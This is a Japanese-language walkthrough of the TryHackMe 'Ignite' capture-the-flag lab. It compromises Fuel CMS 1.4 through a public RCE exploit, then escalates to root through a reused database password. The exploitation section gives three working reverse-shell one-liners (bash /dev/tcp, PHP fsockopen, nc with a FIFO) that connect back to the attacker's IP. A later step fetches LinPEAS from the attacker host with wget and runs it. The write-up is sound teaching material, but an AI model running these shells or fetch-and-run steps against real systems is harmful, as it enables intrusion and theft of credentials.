# THM - Ignite

## 1. Enumeration（偵察）

ターゲットマシンで稼働しているサービスとバージョンを調査する。

```bash
# nmap: ネットワークスキャナ
# -sV: サービスのバージョンを検出する
# -oN nmap.log: 結果を nmap.log ファイルに保存する
nmap -sV -oN nmap.log 10.48.149.92
```

**結果:**
- ポート80が開いている → Apache Web サーバーが稼働
- **Fuel CMS 1.4** が動作していることを確認

ブラウザで `http://10.48.149.92` にアクセスすると、Fuel CMS のウェルカムページが表示される。
ページ内に管理画面の情報が記載されている:

- 管理画面URL: `http://10.48.149.92/fuel`
- デフォルト認証情報: `admin` / `admin`

---

## 2. Exploitation（初期アクセス）

### エクスプロイトの検索・取得

Fuel CMS 1.4 に既知の脆弱性がないか Exploit-DB で検索する。

```bash
# searchsploit: Exploit-DB のローカル検索ツール（Kali に標準搭載）
# "fuel cms" に関連するエクスプロイトを検索
searchsploit fuel cms
```

検索結果から **Fuel CMS 1.4.1 - Remote Code Execution (RCE)** (ID: 50477) を発見。

```bash
# searchsploit -m: エクスプロイトのスクリプトをカレントディレクトリにコピーする
# 50477: Exploit-DB 上の ID 番号
searchsploit -m 50477
```

これで `50477.py`（Python スクリプト）が手元にコピーされる。
このスクリプトは Fuel CMS の `eval` 機能を悪用して、ターゲット上で任意のコマンドを実行できる。

### リバースシェルの確立

**目的:** ターゲットマシンから攻撃マシンへ接続を返させ、対話的なシェルを得る。

#### ステップ1: 攻撃マシンでリスナーを起動

```bash
# nc: netcat（ネットワーク通信ツール）
# -l: リスン（待ち受け）モード
# -v: 詳細出力
# -n: DNS 解決をスキップ（高速化）
# -p 1234: ポート 1234 で待ち受ける
nc -lvnp 1234
```

#### ステップ2: エクスプロイトでリバースシェルのペイロードを実行

以下のいずれか1つを RCE 経由でターゲット上で実行させる:

```bash
# 方法1: Bash リバースシェル
# bash -i: インタラクティブな bash を起動
# >& /dev/tcp/IP/PORT: stdout と stderr を TCP 接続にリダイレクト
# 0>&1: stdin も同じ TCP 接続から読み取る
# → 3つの入出力すべてが攻撃マシンと繋がり、双方向通信が成立する
bash -i >& /dev/tcp/192.168.141.239/1234 0>&1

# 方法2: PHP リバースシェル（Fuel CMS は PHP なので確実に動く）
# fsockopen(): TCP 接続を開く → ファイルディスクリプタ 3 に割り当て
# exec(): /bin/sh の入出力を FD3（= TCP接続）に繋ぐ
php -r '$sock=fsockopen("192.168.141.239",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# 方法3: Netcat + 名前付きパイプ（FIFOファイルで循環的にデータを中継）
# rm /tmp/f: 前回の残りを削除
# mkfifo /tmp/f: 名前付きパイプを作成（データの中継点）
# cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
# → nc が受信したコマンドを FIFO 経由で sh に渡し、結果を nc で返す循環構造
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.239 1234>/tmp/f
```

> **重要:** IP アドレスはターゲットではなく**攻撃マシン（tun0）の IP** を指定する。
> ターゲットが攻撃マシンに「接続しに来る」のがリバースシェルの仕組み。
> `ip addr show tun0` で確認できる。

---

## 3. User Flag

リバースシェル接続後、www-data ユーザーのフラグを取得:

```bash
cat /home/www-data/flag.txt
```

---

## 4. Privilege Escalation（権限昇格）

### LinPEAS による自動列挙

LinPEAS は Linux の権限昇格に使える設定ミスや脆弱性を自動で列挙するスクリプト。

```bash
# === 攻撃マシン側 ===
# linpeas.sh があるディレクトリで簡易 HTTP サーバーを起動
# python3 -m http.server: ポート 8000 でカレントディレクトリを Web 公開する
python3 -m http.server

# === ターゲットマシン側（リバースシェル内） ===
# wget: HTTP 経由でファイルをダウンロードする
# 攻撃マシンの HTTP サーバーから linpeas.sh を取得
wget http://192.168.141.239:8000/linpeas.sh

# sh linpeas.sh: スクリプトを実行
# tee linpeas.log: 結果を画面に表示しつつファイルにも保存する
sh linpeas.sh | tee linpeas.log
```

### DB 設定ファイルからパスワード発見

Fuel CMS が使用する MySQL のデータベース接続設定ファイルを確認する。
Web アプリの設定ファイルにはパスワードが平文で書かれていることが多い。

```bash
cat /var/www/html/fuel/application/config/database.php
```

**発見した認証情報:**
- username: `root`
- password: **`mememe`**

### root への昇格

DB の root パスワードがシステムの root パスワードと同じ（パスワード再利用）。

```bash
# python -c "...": Python ワンライナーを実行
# pty.spawn('/bin/bash'): 疑似端末（PTY）付きの bash を起動する
# → リバースシェルでは TTY がないため su が使えない。これで TTY を確保する
python -c "import pty; pty.spawn('/bin/bash')"

# su root: root ユーザーに切り替え
# パスワード「mememe」を入力
su root
```

---

## 5. Root Flag

```bash
cat /root/root.txt
```

---

## まとめ

| ステップ | 手法 | ポイント |
|---|---|---|
| 偵察 | nmap ポートスキャン | Fuel CMS 1.4 を発見 |
| 初期アクセス | Exploit-DB 50477 (RCE) | Fuel CMS の既知脆弱性を利用 |
| シェル確立 | リバースシェル (PHP/Bash/nc) | 攻撃マシンの IP を指定する |
| 権限昇格 | DB 設定ファイルのパスワード再利用 | `database.php` → `mememe` → `su root` |
